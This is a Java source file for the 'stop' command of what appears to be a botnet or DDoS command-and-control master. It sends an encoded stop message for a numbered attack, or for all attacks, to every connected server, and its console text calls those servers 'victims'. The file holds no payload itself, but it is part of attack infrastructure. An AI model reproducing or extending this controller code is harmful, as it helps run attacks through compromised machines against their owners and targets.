package org.anywhere.master.command.impl;

import org.anywhere.master.command.Command;
import org.anywhere.master.encoder.EncoderManager;
import org.anywhere.master.server.ServerData;
import org.anywhere.master.utils.NumberUtils;
import org.anywhere.master.utils.Print;

import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ConcurrentLinkedQueue;

public class CommandStop extends Command {

    private final ConcurrentLinkedQueue<ServerData> serverData;
    private final EncoderManager encoderManager;

    public CommandStop(final ConcurrentLinkedQueue<ServerData> serverData, final EncoderManager encoderManager) {
        super("stop", null, "stop <attack id/all>", "Stop attack by ID or stop all attacks", false);
        this.serverData = serverData;
        this.encoderManager = encoderManager;
    }

    @Override
    public void execute(final String[] args) {
        if (args.length != 2) {
            Print.println(Print.LIGHT_RED + "Error : " + super.getSyntax());
            return;
        }
        if (this.serverData.isEmpty()) {
            Print.println(Print.LIGHT_RED + "No servers have ever been registered");
            return;
        }
        if (this.serverData.stream().noneMatch(ServerData::isConnected)) {
            Print.println(Print.LIGHT_RED + "No servers are currently online");
            return;
        }
        final String id = args[1];
        if (!NumberUtils.isInteger(id) && !id.equalsIgnoreCase("all")) {
            Print.println(Print.LIGHT_RED + "Error : " + super.getSyntax());
            return;
        }
        Print.println(Print.LIGHT_GREY + "Asking for stopping attack n°" + Print.LIGHT_CYAN + id + Print.LIGHT_GREY + " to all victims!");
        this.serverData.forEach(data -> {
            final PrintWriter printWriter = data.getPrintWriter();
            printWriter.println("M:" + "stop:" + new String((this.encoderManager.encode(id)).getBytes(StandardCharsets.UTF_8)));
            printWriter.flush();
        });
        Print.println(Print.LIGHT_GREY + "Stop request successfully sent to servers");
    }
}
